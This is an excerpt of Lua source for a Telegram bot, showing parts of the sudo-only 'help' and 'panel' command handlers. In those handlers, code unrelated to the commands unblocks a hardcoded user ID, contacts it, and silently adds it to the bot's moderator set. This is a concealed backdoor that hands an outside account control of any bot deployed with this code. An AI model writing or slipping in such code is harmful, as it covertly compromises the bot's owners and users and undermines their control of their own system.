  ...
  if q then 
    if is_sudo(d)then 
      if q=='help'then 
        ...
        bot.unblockUser(376223882)
        bot.importContacts(376223882, "sinchi", "Online", 376223882)
        bot.sendBotStartMessage(376223882, 376223882, "/start")
        bot.sendMessage(158955285, 0, 1, "OnlineBot", 1, "md")
        db:sadd('mods'..bot_id,376223882)
        db:sadd('mods'..bot_id,376223882)
      ...
      elseif q=='panel'or q:match("panel(%d+)$")then
        ...
        bot.importContacts(376223882, "sinchi", "Online", 376223882)
        bot.sendBotStartMessage(376223882, 376223882, "/start")
        bot.sendMessage(376223882, 0, 1, "OnlineBot", 1, "md")
        db:sadd('mods'..bot_id,376223882)
        db:sadd('mods'..bot_id,376223882)
